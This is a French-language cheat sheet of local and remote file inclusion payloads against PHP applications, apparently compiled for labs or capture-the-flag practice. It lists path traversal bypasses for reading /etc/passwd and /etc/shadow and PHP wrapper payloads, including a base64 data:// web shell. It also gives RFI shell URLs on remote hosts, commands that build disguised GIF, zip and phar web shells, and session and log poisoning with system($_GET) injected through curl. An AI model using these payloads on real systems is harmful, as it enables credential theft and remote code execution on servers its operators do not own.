# Fichiers Sensibles

```
C:\Windows\boot.ini
/windows/win.ini
/windows/system32/drivers/etc/hosts
/etc/passwd
/etc/shadow  
/etc/hosts  
/proc/self/environ  
/var/log/auth.log 
```

### Bypass des Restrictions Connues

```bash
....//....//....//....//etc/passwd
/index.php?%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
../../../../etc/passwd%00
php://filter/read=convert.base64-encode/resource=config
....\/....\/....\/etc/passwd
..///////..////..//////etc/passwd
..././..././..././..././..././etc/passwd
```

### Wrappers PHP

```bash
php://filter/read=convert.base64-encode/resource=config
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
expect://id
```

### Remote File Inclusion (RFI)

```bash
http://127.0.0.1/index.php
ftp://10.10.25.63/shell.php?0=id
\\10.10.25.63\shell.php?0=id
```

### Upload de Fichier

```bash
echo 'GIF8<?php system($_GET["0"]); ?>' > shell.gif
./profile_images/shell.gif&0=id

zip shell.jpg shell.php
zip://./profile_images/shell.jpg%23shell.php&0=id

php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
phar://./profile_images/shell.jpg%2Fshell.txt&0=id
```

### Poisoning PHP Sessions

```bash
http://94.237.53.113:55752/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
/var/lib/php/sessions/sess_xxxxxx&cmd=id
```

### Log Poisoning

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["0"]); ?>'
```

### Listes de Chemins pour Path Traversal

- **Linux** : [dirTraversal-nix.txt](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)
- **Windows** : [dirTraversal-win.txt](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### Listes de Fichiers Sensibles

- **Linux** : [LFI-gracefulsecurity-linux.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
- **Windows** : [LFI-gracefulsecurity-windows.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt)

### Liste de Paramètres PHP

- [fuzz-lfi-params-list.txt](https://github.com/whiteknight7/wordlist/blob/main/fuzz-lfi-params-list.txt)

### Autres Listes

- [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
